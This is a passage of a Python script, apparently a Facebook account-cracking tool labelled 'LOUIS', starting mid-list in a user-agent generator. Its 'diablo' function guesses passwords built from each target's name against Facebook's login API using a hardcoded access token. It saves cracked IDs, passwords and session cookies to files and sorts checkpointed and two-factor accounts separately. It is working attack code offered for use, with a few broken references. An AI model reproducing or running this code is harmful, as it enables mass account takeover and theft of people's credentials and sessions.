0.14.114","41.0.0.0.94","39.0.0.0.73","39.0.0.0.88","50.0.0.10.54","45.0.0.38.146","45.0.0.23.146","45.0.0.0.33","47.0.0.25.125","50.0.0.10.54"])
    firefox = str(rc(["137.0", "136.0.1", "135.0.1", "134.0", "134.0", "134.0", "133.0", "132.0", "131.0.2", "130.0.1", "130.0", "129.0.2", "129.0.2", "129.0", "128.0.3", "128.0.2", "128.0", "126.0", "126.0", "126.0", "124.2.0", "124.1.0", "124.1.0", "124.1.0", "124.0", "124.0", "124.0", "24.0", "124.0", "124.0", "123.1.0", "123.1.0", "123.1.0", "123.0", "123.0", "123.0", "122.1.0", "122.1.0", "122.1.0", "122.0.1", "122.0.1", "122.0.1", "122.0", "122.0", "122.0", "122.0", "122.0", "122.0", "121.1.0", "121.1.0", "121.1.0", "121.0.1", "121.0.1", "121.0.1", "121.0", "121.0", "121.0", "121.0", "120.1.1", "120.1.1", "120.1.0", "120.1.0", "120.0.1", "120.0.1", "120.0", "120.0", "120.0", "120.0", "119.1.1", "119.1.1", "119.1.0", "119.1.0", "119.0.1", "119.0.1", "119.0", "119.0", "119.0", "119.0", "118.2.0", "118.2.0", "118.1.1", "118.1.1", "118.1.0", "118.1.0", "118.0", "118.0", "118.0", "118.0", "117.1.0", "117.1.0", "117.0.1", "117.0.1", "117.0", "117.0", "116.3.0", "116.3.0", "116.2.0", "116.2.0", "116.0", "116.0", "116.0", "116.0", "115.2.1", "115.2.1", "115.2.0", "115.2.0", "115.0.1", "115.0.1", "115.0", "115.0", "115.0", "115.0", "114.2.0", "114.2.0", "114.1.1", "114.1.1", "114.1.0", "114.1.0", "114.0", "114.0", "114.0", "114.0", "114.0", "114.0", "113.2.0", "113.2.0", "113.1.0", "113.1.0", "113.0", "113.0", "113.0", "113.0", "112.2.0", "112.2.0", "112.1.0", "112.1.0", "112.0", "112.0", "112.0", "112.0", "111.1.1", "111.1.1", "111.1.0", "111.1.0", "111.0", "111.0", "111.0", "111.0", "110.1.0", "110.1.0", "110.0.1", "110.0.1", "110.0", "110.0", "109.2.0", "109.2.0", "109.1.1", "109.1.1", "109.1.0", "109.1.0", "108.2.0", "108.2.0", "108.1.1", "108.1.1", "108.1.0", "108.1.0", "108.1.0", "108.1.0", "107.2.0", "107.1.0", "107.1.0", "106.1.0", "106.1.0", "105.2.0", "105.2.0", "105.1.0", "105.1.0", "105.1.0", "105.1.0", "104.2.0", "104.2.0", "104.2.0", "104.1.0", "104.1.0", "104.1.0", "104.1.0", "103.2.0", "103.2.0", "103.1.0", "103.1.0", "102.2.1", "102.2.1", "102.2.0", "102.2.0", "102.1.1", "102.1.1", "102.1.0", "101.2.0", "101.2.0", "101.1.1", "101.1.1", "101.1.0", "101.1.0", "100.3.0", "100.3.0", "100.2.0", "100.2.0", "100.1.3", "100.1.3", "100.1.2", "100.1.2", "100.1.1", "100.1.1", "100.1.0", "100.1.0", "99.2.0", "99.2.0", "99.1.1", "99.1.1", "99.1.0", "99.1.0", "98.3.0", "98.3.0", "98.2.0", "98.2.0", "98.1.1", "98.1.1", "97.3.0", "97.3.0", "98.1.0", "98.1.0", "97.2.0", "97.2.0", "97.1.1", "97.1.1", "97.1.0", "97.1.0", "96.3.1", "96.3.1", "96.3.0", "96.3.0", "96.2.0", "96.2.0", "96.1.1", "96.1.1", "96.1.0", "96.1.0", "95.2.0", "95.2.0", "95.1.0", "95.1.0", "94.1.2", "94.1.2", "94.1.1", "94.1.1", "94.1.0", "94.1.0", "94.1.0", "94.1.0", "93.2.0", "93.2.0", "93.1.0", "93.1.0", "93.1.0", "92.1.1", "92.1.1", "92.1.0", "92.1.0", "92.1.0", "92.1.0", "91.4.0", "91.4.0", "91.3.1", "91.3.1", "91.3.0", "91.3.0", "91.2.0", "91.2.0", "91.1.0", "91.1.0", "90.1.3", "90.1.3", "90.1.2", "90.1.2", "90.1.1", "90.1.1", "90.1.1", "90.1.1", "90.1.0", "89.1.1", "89.1.1", "89.1.0", "89.1.0", "88.1.4", "88.1.4", "88.1.3", "88.1.3", "88.1.2", "88.1.2", "88.1.1", "88.1.1", "88.1.0", "88.1.0", "87.0.0-rc.1", "87.0.0-rc.1", "86.1.1", "86.1.1", "86.1.0", "86.1.0", "86.1.0-rc.1", "86.1.0-rc.1", "85.1.3", "85.1.3", "85.1.2", "85.1.2", "85.1.1", "85.1.1", "85.1.0", "85.1.0", "85.1.0-rc.1", "85.1.0-rc.1", "84.1.4", "84.1.4", "84.1.3", "84.1.3", "84.1.2", "84.1.2", "84.1.1", "84.1.1", "84.1.0", "84.1.0", "84.1.0-rc.1", "83.1.0", "83.1.0", "83.1.0-rc.2", "83.1.0-rc.2", "83.1.0-rc.1", "83.1.0-rc.1", "82.1.3", "82.1.3", "82.1.2", "82.1.2", "82.1.1", "82.1.1", "82.1.0", "82.1.0", "82.1.0-rc.2", "82.1.0-rc.2", "82.1.0-rc.1", "82.1.0-rc.1", "81.1.5", "81.1.5", "81.1.4", "81.1.4", "81.1.3", "81.1.3", "81.1.2", "81.1.2", "81.1.1", "81.1.1", "81.1.0", "81.1.0", "81.1.0-rc.1", "80.1.3", "80.1.3", "80.1.2", "80.1.2", "80.1.1", "80.1.1", "80.1.0", "79.0.5", "79.0.5", "79.0.4", "79.0.4", "79.0.3", "79.0.3", "79.0.2", "79.0.2", "79.0.1", "79.0.1", "79.0.0", "79.0.0", "68.11.0", "68.11.0", "68.10.1", "68.10.1", "68.10.0", "68.10.0", "68.10.0", "68.9.0", "68.9.0", "68.8.1", "68.8.1", "68.8.0", "68.8.0", "68.8.0", "68.8.0", "68.7.0", "68.7.0", "68.6.0", "68.6.0", "68.6.0", "68.5.0", "68.5.0", "68.5.0", "68.5.0", "68.4.2", "68.4.2", "68.4.1", "68.4.1", "68.4.0", "68.4.0", "68.3.0", "68.3.0", "68.2.1", "68.2.1", "68.2.0", "68.2.0", "68.2.0", "68.1.1", "68.1.1", "68.1", "68.1", "68.0.2", "68.0.2", "68.0", "68.0", "68.0", "68.0", "67.0.3", "67.0.3", "67.0.2", "67.0.2", "67.0", "67.0", "66.0.5", "66.0.5", "66.0.4", "66.0.4", "66.0.2", "66.0.2", "66.0.1", "66.0", "66.0", "66.0", "66.0", "65.0.1", "65.0.1", "65.0", "65.0", "65.0", "64.0.2", "64.0.2", "64.0.1", "64.0.1", "63.0.2", "63.0.2", "63.0", "63.0", "62.0.3", "62.0.3", "62.0.2", "62.0.1", "62.0.1", "62.0", "62.0", "61.0.2", "61.0.2", "61.0", "61.0", "61.0", "60.0.2", "60.0.1", "60.0.1", "60.0", "59.0.2", "59.0.1", "59.0.1", "59.0", "59.0", "59.0", "58.0.2", "58.0.2", "58.0.1", "58.0.1", "58.0", "57.0.4", "57.0.1", "57.0.1", "57.0", "57.0", "56.0", "56.0", "55.0.2", "55.0.2", "55.0", "55.0", "54.0.1", "54.0", "53.0.2", "53.0.1", "53.0.1", "53.0", "52.0.2", "52.0.1", "52.0", "51.0.4", "51.0.3", "51.0.2", "51.0", "51.0", "50.1.0", "50.0.2", "50.0.1", "50.0", "49.0.2", "49.0", "48.0.3", "48.0", "47.0", "47.0", "46.0.1", "46.0", "45.0.2", "45.0.1", "45.0", "44.0.2", "44.0", "43.0", "42.0.2", "42.0.1", "42.0", "41.0.2", "41.0", "40.0.3", "40.0", "40.0", "39.0.2", "39.0", "39.0", "38.0.5", "38.0.1", "38.0", "37.0.2", "37.0.2", "37.0.1", "37.0", "36.0.4", "36.0.2", "36.0.2", "36.0", "35.0.1", "35.0", "35.0", "33.1", "33.1", "33.0", "32.0.3", "32.0.1", "32.0", "31.0", "30.0", "29.0.1", "29.0", "28.0.1", "28.0", "27.0", "26.0.1", "26.0", "25.0.1", "25.0", "24.0", "23.0", "22.0", "21.0", "20.0.1", "19.0.2", "19.0", "18.0", "17.0", "16.0.2", "16.0.1", "15.0.1", "15.0", "14.0.1", "14.0", "10.0.5", "10.0.4", "10.0.3", "10.0.2", "10.0.1", "10.0", "9.0", "6.0.2", "6.0"]))
    az = (["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])
    mobile = str(rr(10,19))+str(rc(az))+str(rr(100,299))
    yan = str(rr(10,90))+".0"
    web = str(rr(500,604))+"."+str(rr(0,99))+"."+str(rr(0,99))
    model = str(rc(["iPhone","iPhone 11","iPhone 11 Pro","iPhone 11 Pro Max","iPhone 12","iPhone 12 Mini","iPhone 12 Pro","iPhone 12 Pro Max","iPhone 13","iPhone 13 Mini","iPhone 13 Pro","iPhone 13 Pro Max","iPhone 14","iPhone 14 Plus","iPhone 14 Pro","iPhone 14 Pro Max","iPhone 15","iPhone 15 Plus","iPhone 15 Pro","iPhone 15 Pro Max","iPhone 16","iPhone 16 Plus","iPhone 16 Pro","iPhone 16 Pro Max","iPhone 3G","iPhone 3GS","iPhone 4","iPhone 4S","iPhone 5","iPhone 5C","iPhone 5S","iPhone 6","iPhone 6 Plus","iPhone 6s","iPhone 6s Plus","iPhone 7","iPhone 7 Plus","iPhone 8","iPhone 8 Plus","iPhone SE","iPhone SE (2020)","iPhone SE (2022)","iPhone X","iPhone XR","iPhone XS","iPhone XS Max"]))
def uav():
        model2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
        LOUIS = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/75.0.0.48.61;FBBV/45926345;FBDM/{density=3.0,width=1440,height=2560};FBLC/fr_VU;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G928I;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
        ua = random.choice([f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))",])+LOUIS
        return uav
    
def diablo(uid,pwx,name,fl):
    global oks,loop,cps,twf
    sys.stdout.write(f'\r{random.choice(color)}LOUIS {random.choice(color)}{loop}/{str(len(fl))} \x1b[1;92mOK:{str(len(oks))}\033[1;37m \x1b[1;95mCP:{str(len(cps))}\033[1;37m \x1b[1;93m2F:{str(len(twf))}\033[0;00m\r');sys.stdout.flush()    
    First=name.split(" ")[0]
    try:
        Last=name.split(" ")[1]
    except:
        Last=First
    try:
        for pw in pwx:
            ps=pw.replace("first",First.lower()).replace("First",First).replace("last",Last.lower()).replace("Last",Last).replace("Name",name).replace("name",name.lower()).replace("FIRST",First.upper()).replace("LAST",Last.upper())
            useragent = night_ua()
            access_token = '6628568379|c1e620fa708a1d5696fb991c1bde5662'
            data = {
            'adid':str(uuid.uuid4()),
            'format':'json',
            'api_key':'c1e620fa708a1d5696fb991c1bde5662',
            'community_id':'',
            'device_id':str(uuid.uuid4()),
            'family_device_id':str(uuid.uuid4()),
            'currently_logged_in_userid':'0',
            'try_num':'1',
            'email':uid,
            'password':ps,
            'generate_analytics_claim':'1',
            'cpl':'true',
            'generate_session_cookies':'1',
            'credentials_type':'password',
            'error_detail_type':'button_with_disabled',
            'source':'auth.login',
            'locale':'en_US',
            'client_country_code':'US',
            'advertising_id':str(uuid.uuid4()),
            'meta_inf_fbmeta':'NO_FILE',
            'access_token':access_token}
            head = {
            'User-Agent': useragent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5000',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            rq = requests.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            ####rq=requests.post(url,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f'\r\r[bold green] ┌─[OK] {uid}•{ps}\n└─{random.choice(asux)}{coki}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
                open('/sdcard/LOUIS1-OK/'+okc,'a').write(uid+'|'+ps+'|'+useragent+'|'+coki+'\n')
                open('/sdcard/LOUIS1-COOKIE.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rq):
                print(f'\r\r[bold yellow]┌─[2F] {uid}•{ps}└─{useragent}[bold green]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                open('/sdcard/LOUIS-2F/'+twc,'a').write(uid+'|'+ps+'\n')
                twf.append(uid)
                break
            elif 'www.facebook.com' in rq['error']['message']:
                print(f'\r\r[bold purple]┌─[CP] {uid}•{ps}└─{useragent}[bold green]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');open('/sdcard/LOUIS1-CP.txt', 'a').write(uid+'|'+ps+'\n');cps.append(uid);break
            
            else:continue 
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(30)


main()
#open('/sdcard/LOUIS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                               # open('/sdcard/LOUIS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')